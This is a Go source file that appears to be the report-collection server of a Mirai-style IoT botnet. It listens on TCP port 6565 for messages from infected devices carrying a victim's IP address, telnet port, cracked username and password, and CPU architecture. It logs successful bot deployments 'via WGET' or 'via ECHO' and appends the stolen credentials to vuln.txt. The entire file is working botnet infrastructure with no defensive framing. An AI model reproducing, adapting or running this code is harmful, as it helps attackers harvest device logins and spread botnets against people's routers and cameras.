package main

import (
    "fmt"
    "net"
    "encoding/binary"
    "errors"
    "time"
    "os"
)

func main() {
    l, err := net.Listen("tcp", "0.0.0.0:6565")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := l.Accept()
        if err != nil {
            break
        }
        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(10 * time.Second))
    bufChk, err := readXBytes(conn, 1)
    if err != nil {
		fmt.Printf("Failed buf check!\n")
        return
    }

    var ipInt uint32
	var portInt uint16
    var statusInt uint16

    if bufChk[0] == 0 {
		statusBuf, err := readXBytes(conn, 2)
        if err != nil {
			return
			fmt.Printf("Failed statusBuf check!\n")
        }
		statusInt = binary.BigEndian.Uint16(statusBuf)
		
        ipBuf, err := readXBytes(conn, 4)
        if err != nil {
			fmt.Printf("Failed ipBuf check!\n")
            return
        }
        ipInt = binary.BigEndian.Uint32(ipBuf)

        portBuf, err := readXBytes(conn, 2)
        if err != nil {
			fmt.Printf("Failed portBuf check!\n")
            return;
        }

		portInt = binary.BigEndian.Uint16(portBuf)
		
    } else {
        ipBuf, err := readXBytes(conn, 3)
        if err != nil {
			fmt.Printf("Failed ipBuf2 check!\n")
            return;
        }
        ipBuf = append(bufChk, ipBuf...)

        ipInt = binary.BigEndian.Uint32(ipBuf)

        portInt = 23
	}
	
	aLenBuf, err := readXBytes(conn, 1)
    if err != nil {
		fmt.Printf("Failed aLenBuf check!\n")
        return
    }
    archBuf, err := readXBytes(conn, int(byte(aLenBuf[0])))

    uLenBuf, err := readXBytes(conn, 1)
    if err != nil {
		fmt.Printf("Failed uLenBuf check!\n")

        return
    }
    usernameBuf, err := readXBytes(conn, int(byte(uLenBuf[0])))

    pLenBuf, err := readXBytes(conn, 1)
    if err != nil {
		fmt.Printf("Failed pLenBuf check!\n")
        return
    }
    passwordBuf, err := readXBytes(conn, int(byte(pLenBuf[0])))
    if err != nil {
		fmt.Printf("Failed passwordBuf check!\n")
        return
    }

    if statusInt == 0 {
		fmt.Printf("[%s] Attempting --> %d.%d.%d.%d:%d (%s:%s) (%s) (%d)\n", conn.RemoteAddr(), (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf), string(archBuf), statusInt)
	}

	if statusInt == 1 {
		fmt.Printf("[%s] Bot successfully deployed via WGET--> %d.%d.%d.%d:%d (%s:%s) (%s) (%d)\n", conn.RemoteAddr(), (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf), string(archBuf), statusInt)
	}

	if statusInt == 2 {
		fmt.Printf("[%s] Bot successfully deployed via ECHO--> %d.%d.%d.%d:%d (%s:%s) (%s) (%d)\n", conn.RemoteAddr(), (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf), string(archBuf), statusInt)
    }

    f, err := os.OpenFile("vuln.txt", os.O_APPEND|os.O_WRONLY, 0600)
    if err != nil {
        panic(err)
    }

    defer f.Close()

    fmt.Fprintf(f, "%d.%d.%d.%d:%d %s:%s\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf))

    f.Close()

}

func readXBytes(conn net.Conn, amount int) ([]byte, error) {
    buf := make([]byte, amount)
    tl := 0

    for tl < amount {
        rd, err := conn.Read(buf[tl:])
        if err != nil || rd <= 0 {
            return nil, errors.New("Failed to read")
        }
        tl += rd
    }

    return buf, nil
}